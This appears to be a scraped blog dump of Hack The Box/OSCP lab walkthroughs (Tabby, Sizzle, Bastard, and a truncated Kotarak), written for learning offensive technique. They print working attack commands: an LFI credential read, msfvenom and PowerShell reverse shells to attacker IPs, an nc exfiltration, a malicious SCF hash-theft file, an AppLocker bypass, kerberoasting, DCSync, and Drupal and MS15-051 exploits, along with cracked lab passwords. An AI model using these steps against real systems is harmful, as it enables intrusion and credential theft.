2024","externalUrl":null,"permalink":"/tags/lfi/","section":"Tags","summary":"","title":"LFI"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/tags/lxc/","section":"Tags","summary":"","title":"Lxc"},{"content":" Scanning : # Run nmap scan to see open ports and services.\n\u0026gt; nmap -A -Pn -T4 10.10.10.194 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 45:3c:34:14:35:56:23:95:d6:83:4e:26🇩🇪c6:5b:d9 (RSA) | 256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA) |_ 256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Mega Hosting |_http-server-header: Apache/2.4.41 (Ubuntu) 8080/tcp open http Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Scan all ports but i don’t find more open ports.\n\u0026gt; nmap -p- -T5 -sS -n 10.10.10.194 --max-retries 1 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy Enumerate web App : # When i navigate on the web site a see the hostname of the machine megahosting.htb, so i must add it to my /etc/hosts file.\necho \u0026#34;10.10.10.194 megahosting.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumerate the web file and directory with gobuster.\n\u0026gt; gobuster dir -u http://10.10.10.194/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt,html -t50 Run whatweb to get more informations the web site technologies.\n\u0026gt; whatweb -a 3 http://megahosting.htb/ http://megahosting.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[sales@megahosting.com,sales@megahosting.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.194], JQuery[1.11.2], Modernizr[2.8.3-respond-1.4.2.min], Script, Title[Mega Hosting], X-UA-Compatible[IE=edge] Exploit LFI : # I find new endpoints on /new.php this endpoint meen to tell file name statement\nSo i try to exploit LFI to leak internal file like /etc/passwd.\n\u0026gt; news.php?file=../../../../etc/passwd Ok that a good think and we know a tomcat app is setup on 8080.\nSo thanks to the lfi I wil try to read tomcat-user.xml file because this file contain user and password for tomcat manager pannel.\nI search on the internet where is located this file and I find this ressource.\nUbuntu – File list of package tomcat9/focal/all\nSo lets try all this file and the good one is /usr/share/tomcat9/etc/tomcat-users.xml\nnews.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml Now to get rce it is possible to upload war payload, so firt generate it with msfvenom.\n\u0026gt; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.52 LPORT=4444 -f war -o shell.war uplaod the payload on the server with curl.\n\u0026gt; curl --upload-file shell.war -u \u0026#39;tomcat:$3cureP4s5w0rd123!\u0026#39; \u0026#34;http://10.10.10.194:8080/manager/text/deploy?path=/shell\u0026#34; Now go on /shell in the web app and get your reverse shell on port 4444.\nTomcat to Ash : # I run a quick linpeas to enumerate the system and I see informations about the user ash, this user is part a of group lxd that meen i can use technique to eleate my privileges as root.\nBut I am not yet ash.\nI search some information in web file and i find a backup file named 16162020_backup.zip lets download it localy.\n# on attacker machine \u0026gt; nc -lnvp 4445 \u0026gt; backup.zip # on victime machine \u0026gt; nc 10.10.14.52 4445 \u0026lt; 16162020_backup.zip I try to unzip the file it is protected by password, lets crack it with john.\n\u0026gt; zip2john backup.zip \u0026gt; zip.hash \u0026gt; john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt After cracking the password is admin@it\nLets try to move on ash with this password.\nI need interactive shell so i will use ssh because it is setup on the server, I can generate a private key to login in using ssh protocole.\n\u0026gt; mkdir .ssh \u0026gt; cd .ssh \u0026gt; ssh-keygen -t rsa \u0026gt; cat id_rsa.pub \u0026gt; authorized_keys Use the private key to login on the server as ash user.\n\u0026gt; ssh -i id_rsa ash@10.10.10.194 Gain root : # So to exploit the lxd group and escalate the root privilege of the host machine we have to create an image for lxd.\nSo frist step download alpine image.\n\u0026gt; git clone https://github.com/saghul/lxd-alpine-builder.git Open a web server and downloads on the victim.\n# attacker \u0026gt; python3 -m http.server 800 # victim \u0026gt; wget http://10.10.14.52:800/alpine-v3.13-x86_64-20210218_0139.tar.gz build the image.\n\u0026gt; /snap/bin/lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias anii look if the image is build.\n\u0026gt; /snap/bin/lxc image list now mount the container with the following command.\n/snap/bin/lxc init ani tabby -c security.privileged=true But i get an error so I need to creat on new pool storage.\n# use default options \u0026gt; lxd init Now run command to run containers and pop shell on this containers.\n\u0026gt; lxc init anii tabby -c security.privileged=true \u0026gt; lxc config device add tabby mypool disk source=/ path=/mnt/root recursive=true \u0026gt; lxc start tabby \u0026gt; lxc exec tabby /bin/sh Now read the flag it is located on initial disk as root privileges.\nthis machine was really fun I learned new tricks ! :D\n","date":"29 April 2024","externalUrl":null,"permalink":"/posts/tabby/","section":"Posts","summary":"Scanning : # Run nmap scan to see open ports and services.","title":"OSCP boxe - Tabby"},{"content":" Scanning : # Run nmap scan to get open ports and services.\n\u0026gt; nmap -sV -sC -T4 -Pn 10.10.10.103 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 443/tcp open ssl/http Microsoft IIS httpd 10.0 | tls-alpn: | h2 |_ http/1.1 |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Potentially risky methods: TRACE | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. |_http-server-header: Microsoft-IIS/10.0 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time. Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 3s, deviation: 0s, median: 3s | smb2-time: | date: 2024-05-01T15:39:33 |_ start_date: 2024-05-01T15:36:08 This machine was a domaine controleur, we need to add the domain and the FQDN to yout /etc/hosts.\n\u0026gt; echo \u0026#34;10.10.10.103 sizzle.htb.local htb.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumerat SMB : # I always start with the smb service so lets try to connect on it using null session or Guest session.\nOk i can log in with Guest and null session i try to enumerate the share also with cme.\n\u0026gt; crackmapexec smb 10.10.10.103 -u \u0026#39;Guest\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.103 445 SIZZLE [+] HTB.LOCAL\\Guest: SMB 10.10.10.103 445 SIZZLE [+] Enumerated shares SMB 10.10.10.103 445 SIZZLE Share Permissions Remark SMB 10.10.10.103 445 SIZZLE ----- ----------- ------ SMB 10.10.10.103 445 SIZZLE ADMIN$ Remote Admin SMB 10.10.10.103 445 SIZZLE C$ Default share SMB 10.10.10.103 445 SIZZLE CertEnroll Active Directory Certificate Services share SMB 10.10.10.103 445 SIZZLE Department Shares READ SMB 10.10.10.103 445 SIZZLE IPC$ READ Remote IPC SMB 10.10.10.103 445 SIZZLE NETLOGON Logon server share SMB 10.10.10.103 445 SIZZLE Operations SMB 10.10.10.103 445 SIZZLE SYSVOL Logon server share The Guest user have access on a share named Department Shares lets get all of it content.\n\u0026gt; smbclient \\\\\\\\sizzle.htb.local\\\\\u0026#34;Department Shares\u0026#34; -U Guest # get all the content and analyse it localy \u0026gt; recuse on \u0026gt; prompte off \u0026gt; mget * I try to enumerate domain user with rid brute force and i can this users.\n\u0026gt; crackmapexec smb 10.10.10.103 -u \u0026#39;Guest\u0026#39; -p \u0026#39;\u0026#39; --rid-brute 10000 # Users list SIZZLE$ amanda mrlky sizzler Administrator krbtgt SCF file Attack : # So go back on the smb service i have acces on lot of share lets try to enumerate all the permission on it.\nI find i can put some file on the smb share Users/Public.\n\u0026gt; smbcacls -N \\\\\\\\sizzle.htb.local\\\\\u0026#34;Department Shares\u0026#34; Users/Public REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:Everyone:ALLOWED/OI|CI/FULL ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL When we can put some file on windows environnement i can try SCF File attack to steal NTLMv2 of domain user ( if the user open my malicious file ).\nCreate a file named @exploit.scf and paste this on it.\n[Shell] Command=2 IconFile=\\\\10.10.14.52\\share\\test.ico [Taskbar] Command=ToggleDesktop now open responder and put the malicious file on the Users/Public Folder.\n# Open responder \u0026gt; responder -I tun0 # put the file on folder \u0026gt; put @exploit.scf wait for connection. ( You can find this hash in /usr/share/reponder/logs )\nWe Get connection and steal the hash for amanda user. Lets try to crack the ntlmv2 hash.\n\u0026gt; hashcat -a 0 -m 5600 amanda.txt /usr/share/wordlists/rockyou.txt AMANDA::HTB:091314b0e760d6a0:9fa3258c3d31e52b901c3e660c6789bc:0101000000000000003c42639b9cda011fdde6c2ade7b9750000000002000800370056004c00310001001e00570049004e002d00550042005a004f00500041005900510049005400340004003400570049004e002d00550042005a004f0050004100590051004900540034002e00370056004c0031002e004c004f00430041004c0003001400370056004c0031002e004c004f00430041004c0005001400370056004c0031002e004c004f00430041004c0007000800003c42639b9cda0106000400020000000800300030000000000000000100000000200000755086bc236af9cd7481624a18dac4dde03f51d3563a68ecb9529899aa08ed390a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0035003200000000000000000000000000:Ashare1972 Use CME to valid the credentials and get the first access on the domain.\n\u0026gt; crackmapexec smb 10.10.10.103 -u \u0026#39;amanda\u0026#39; -p \u0026#39;Ashare1972\u0026#39; SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.103 445 SIZZLE [+] HTB.LOCAL\\amanda:Ashare1972 With this user we can get access on the network share named CertEnroll.\n\u0026gt; smbclient -N \\\\\\\\sizzle.htb.local\\\\\u0026#34;CertEnroll\u0026#34; -U \u0026#39;amanda%Ashare1972\u0026#39; # Get all the content smb: \\\u0026gt; prompt off smb: \\\u0026gt; recurse on smb: \\\u0026gt; mget * I try some domain enumeration with bloodhound.\n\u0026gt; bloodhound-python -d HTB.local -u amanda -p \u0026#39;Ashare1972\u0026#39; -dc sizzle.htb.local -ns 10.10.10.103 --auth-method ntlm -c all I see amanda is part of group REMOTE MANAGEMENT USERS\nAbuse ADCS to get PSremote session : # So we could login the server with winrm and get a shell as amanda**.**\n\u0026gt; evil-winrm -i sizzle.htb.local -u amanda -p \u0026#39;Ashare1972\u0026#39; But i get an error So a return on my content of the network share, this file containt .crl file that so this makes me think of an ADCS service and the network sharing name I thought I should try to access the ADCS web utility\nOn url add /sertsrv You can authenticate on the service using amanda credentials.\nWith this interface we are able de generate a user certificat signed by the CA authority. First we need a certificat request ( .csr file ) we could generate it with openssl.\n\u0026gt; openssl req -newkey rsa:2048 -keyout amanda.key -out amanda.csr # Paye close attention to this part Common Name (e.g. server FQDN or YOUR name) []:sizzle.htb.local when this is done copy the content of the .csr and go to the ADCS web interface.\nClick on request a certificate ⇒ advanced certificate request , Paste the content of the .csr file and click on submit.\nDownlaod the certificate and us it to login using evil-winrm and open a PSremote session.\n\u0026gt; evil-winrm -i 10.10.10.103 -c certnew.cer -k amanda.key -S Bypass Applocker and defender : # So i re take my bloodhound graph and i see the user mrlky is vulnerable to kerberoasting because it have SPN set.\nIt is confirmed by GetUserSPNs from impacket.\n\u0026gt; impacket-GetUserSPNs HTB.local/amanda:\u0026#39;Ashare1972\u0026#39; -dc-ip 10.10.10.103 Impacket v0.11.0 - Copyright 2023 Fortra ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ----- ----------------------------------------------------- -------------------------- -------------------------- ---------- http/sizzle mrlky CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL 2018-07-10 14:08:09.536421 2018-07-12 10:23:50.871575 But the kerberos port is filtered so that meen we can not get Service Ticket or TGT from linux.\n\u0026gt; nmap -p88 10.10.10.103 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 07:32 EDT Nmap scan report for sizzle.htb.local (10.10.10.103) Host is up (0.021s latency). PORT STATE SERVICE 88/tcp filtered kerberos-sec So i need to do portfowarding or pivoting to get access on this port. But the applocker block my chisel binary and it block powerview script.\nSo i will generate a payload using GreatSCT to bypass it.\n\u0026gt; ./GreatSCT.py \u0026gt; use 9 \u0026gt; set lhost 10.10.14.52 \u0026gt; generate Start metasploit with .rc file.\n\u0026gt; msfconsole -r \u0026lt;FILE\u0026gt;.rc Upload the malicious binary and run it.\n\u0026gt; Invoke-WebRequest -URI http://10.10.14.52:800/rev.xml -OutFile rev.xml # run with msbuild.exe \u0026gt; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe rev.xml Exploit Kerberoasting : # With the meterpreter session i will be able to made pivoting with the meterpreter module and configure socks proxy.\n# On msfconsole \u0026gt; use server/socks_proxy \u0026gt; route add 10.10.10.0 255.255.255.0 \u0026lt;SESSION_NUMBER\u0026gt; \u0026gt; exploit Your /etc/proxychains.conf file must point to port 1080.\nsocks5 127.0.0.1 1080 Now we are able to run kerberoasting from linux with impacket tool.\n\u0026gt; proxychains impacket-GetUserSPNs htb.local/amanda:\u0026#39;Ashare1972\u0026#39; -dc-ip 10.10.10.103 -request-user mrlky -target-domain htb.local -outputfile kerberos.txt Crack the TGS with hashcat.\n\u0026gt; hashcat -a 0 -m 13100 kerberos.txt /usr/share/wordlists/rockyou.txt $krb5tgs$23$*mrlky$HTB.LOCAL$htb.local/mrlky*$13cf363d838f92b2f554ca7d39544dc6$2a295bf40a25aa1bc96fb72902c0d2ea6b9f75317fa775cf0eaf10ac623f2a707c0018c6686b04b8850bcb1552ad4de6a41da9760f103d4728e686124298703305e88766fe51b155d3f4c450597f6b18b5cd9d1104606ddb19d4ffec0c8c9fc604b60e31f0d8182f6662cf8827dd86fe98b47d83d92ce42018936eb77e8cd32fdcf5795071a93905b7770aa52a29a54f14518f74345105e6a063bb1ef0f89d7c62b39f74a2d6fff593550e34877bbf9a1eba1a38ce7c72a9cb08eea1fe91a7531055d8dac4986e0752e2a76c6e0253cf596b7f7c50e0d07c8cc998ed91183de78f8b952681ff9fb89907ffadce183e618e089e2f258a72bdde7e5accbeaa9816546eaed30e904b2016ef42662c5980517a841dd3d3a11e8d92a8095305e70d48af5e4cedc5e963e5baeceabd98dfd34453168f6608851c6a39dbcf374f76477d0755bb610435ccc2f52e99099ed03fbbf09e6aebdae9b69689330c2f401126cd22f682285759d822f30bb2c001173c3853196abfc84e4b98275024c21fb9217aaa121787b579748afa0f9e1b18a791f43abb8ea2c1e206350c42f9a380dc4a6db21cf3a6a28618936059b76908b385d7c86a4844146f60f3d9a6c3d3b91d27cfaa8e0dc74e6415018c01f20201890ace5185a1653f99524076f49386ade55fdcafad14739bd17a96ee66f691f4fe34cacbafdbae8fd288a4e49357fceefc0262b58992962eda76e3e86ece9afdaebf6c8e73e7e972978ac861a965cf878e6303a885fd894e2987422464307a17086763f22e21154b2f97a877c93adb875b81a5b04207b4a397504f4b880f2f20efe5bdcc3a2d98cd999179195a52805af350360c65d23f4f3d9ad805de29e084cc3387607690ee7526e0f20a53ffacd52a4e42cfbb4674dc2dbc83e0a8512f82f521b53d469a8b1b4879849b41e8667477a96e4befd5c5c31ed906ff1919c94291dd2a564fadd3a6a290ab8e8b86e71c1cc952e13ac6276a6750c5b36ebf08fce69b9f5231015e1c6fcf29a36b4aad2314fc127b5c8f7d65b026877765d3402dc04e44ffcf525c8a62f2e0b181533a7c1b77929ea237d0ee8d65e06ffa8eae5a3b5594fa166c3b80c86aa74bb28eb9a4f6009f12d33dcd877ff66eb702888b8cad7dc7b6c3581cf0b298f5fe1cb25bfae5309fa33eefaf5ad39c3366ef393ede1741c58a28adeb0551e07351a78bce638323793917610ef7fba33151455ed6e4f41ff76c47259ff69e9a4a:Football#7 valid the hash with CME.\n\u0026gt; crackmapexec smb 10.10.10.103 -u mrlky -p \u0026#39;Football#7\u0026#39; SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.103 445 SIZZLE [+] HTB.LOCAL\\mrlky:Football#7 Dump domain hashs : # I look bloodhound to see what i can do with the user.\nThis user has ACLs to dump domain hashes, especially to do DCsync thanks to replication ACLs.\nWe can do this with secretdump.\n\u0026gt; impacket-secretsdump HTB.local/mrlky:\u0026#39;Football#7\u0026#39;@10.10.10.103 -target-ip 10.10.10.103 -just-dc-user Administrator Impacket v0.11.0 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3 Administrator:des-cbc-md5:ad7afb706715e964 [*] Cleaning up... Get the root hash.\n# user crackmapexec smb 10.10.10.103 -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -x \u0026#39;more C:\\Users\\mrlky\\Desktop\\user.txt\u0026#39; # root \u0026gt; crackmapexec smb 10.10.10.103 -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -x \u0026#39;more C:\\Users\\Administrator\\Desktop\\root.txt\u0026#39; This machine was incredible, I learned new technique including bypass the closed kerberos port and be able to make a kerberoasting, soon ready for offshore. :)\n","date":"29 April 2024","externalUrl":null,"permalink":"/posts/sizzle/","section":"Posts","summary":"Scanning : # Run nmap scan to get open ports and services.","title":"Sizzle - Insane"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/tags/tomcat/","section":"Tags","summary":"","title":"Tomcat"},{"content":"","date":"15 April 2024","externalUrl":null,"permalink":"/tags/latteral-movements/","section":"Tags","summary":"","title":"Latteral Movements"},{"content":" Scanning : # scan target to get open ports and services.\n\u0026gt; nmap -sS -sC -sV -T4 10.10.10.9 -Pn 80/tcp open http Microsoft IIS httpd 7.5 |_http-generator: Drupal 7 (http://drupal.org) |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to Bastard | Bastard | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC scan all ports.\n80/tcp open http 135/tcp open msrpc 49154/tcp open unknown Enumeration Drapul : # Get acces on the web app, this web app use drupal CMS.\nuse **whatweb** to grad more informations about the web page.\n\u0026gt; whatweb -a 3 http://10.10.10.9/ http://10.10.10.9/ [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET] Get the version of drupal :\n\u0026gt; curl -s http://10.10.10.9/CHANGELOG.txt | grep -m2 \u0026#34;\u0026#34; Drupal 7.54, 2017-02-01 Search on google a potential exploit and i find the CVE-2018-7600 .\nGitHub - pimps/CVE-2018-7600: Exploit for Drupal 7 \u0026lt;= 7.57 CVE-2018-7600\nExploitation : # clone the repo and run the exploit.\n\u0026gt; git clone https://github.com/pimps/CVE-2018-7600 # run exploit and get command execution \u0026gt; python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c whoami run reverse shell with powershell base64 payload.\n\u0026gt; python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c \u0026#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=\u0026#39; Privileges Escalation : # I try to Run Windows Exploit Suggester to find kernel exploit on the kernel version.\nFirst you need to creat file who contain the result of systeminfo command on windows target machine.\nHost Name: BASTARD OS Name: Microsoft Windows Server 2008 R2 Datacenter OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 55041-402-3582622-84461 Original Install Date: 18/3/2017, 7:04:46 �� System Boot Time: 15/4/2024, 11:25:15 �� System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 2.047 MB Available Physical Memory: 1.578 MB Virtual Memory: Max Size: 4.095 MB Virtual Memory: Available: 3.607 MB Virtual Memory: In Use: 488 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.9 Because of what python library problem I am forced to use metasploit module to list kernel exploits\nlets exploit **ms15_051** with metasploit.\nConfigure the exploit.\n\u0026gt; use exploit/windows/local/ms15_051_client_copy_image \u0026gt; set session 1 \u0026gt; set target 1 \u0026gt; set payload windows/x64/shell/reverse_tcp \u0026gt; run Exploit ms15_051 Manually. # I grab the compile exploit from this ressource.\nwindows-kernel-exploits/MS15-051/README.md at master · SecWiki/windows-kernel-exploits\nSo download the .zip file.\nhttps://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip\nOpen a smbserver with impacket-smbserver to store the exploit and for facilitate the running compatibility\n# you need run the smbserver on the same directory to the exploit. \u0026gt; impacket-smbserver share . Now from the windows machine connect on the smb share on run the exploit binary.\n\u0026gt; \\\\10.10.14.9\\share\\ms15-051x64.exe whoami Get a reverse shell with nc.exe binary.\n\\\\10.10.14.9\\share\\ms15-051x64.exe \u0026#34;\\\\10.10.14.9\\share\\nc.exe 10.10.14.9 1338 -e cmd\u0026#34; ","date":"15 April 2024","externalUrl":null,"permalink":"/posts/bastard/","section":"Posts","summary":"Scanning : # scan target to get open ports and services.","title":"OSCP boxe - Bastard"},{"content":"","date":"15 April 2024","externalUrl":null,"permalink":"/tags/ssrf/","section":"Tags","summary":"","title":"SSRF"},{"content":"","date":"15 April 2024","externalUrl":null,"permalink":"/tags/wget-rce/","section":"Tags","summary":"","title":"Wget RCE"},{"content":" Scanning : # Run nmap scan.\n\u0026gt; nmap -sV -sC -sS -T4 10.10.10.55 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA) | 256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA) |_ 256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519) 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: | Supported methods: GET HEAD POST PUT DELETE OPTIONS | Potentially risky methods: PUT DELETE |_ See https://nmap.org/nsedoc/scripts/ajp-methods.html 8080/tcp open http Apache Tomcat 8.5.5 |_http-title: Apache Tomcat/8.5.5 - Error report | http-methods: |_ Potentially risky methods: PUT DELETE |_http-favicon: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Scan all ports on the target.\n\u0026gt; nmap -p- -n -Pn -T5 --max-retries 1 10.10.10.55 -sS PORT STATE SERVICE 22/tcp open ssh 8009/tcp open ajp13 8080/tcp open http-proxy 60000/tcp open unknown We found unknow port lets see what service is behind.\n\u0026gt; nmap -p 60000 10.10.10.55 -sV -sC -T4 PORT STATE SERVICE VERSION 60000/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Kotarak Web Hosting Enumerating web app : # Use whatweb to get more informations about web server.\n\u0026gt; whatweb -a 3 http://10.10.10.55:60000/ http://10.10.10.55:60000/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.55], Title[Kotarak Web Hosting][Title element contains newline(s)!] Enumerate directory with dirsearch.\n\u0026gt; dirsearch -u http://10.10.10.55:60000/ -w 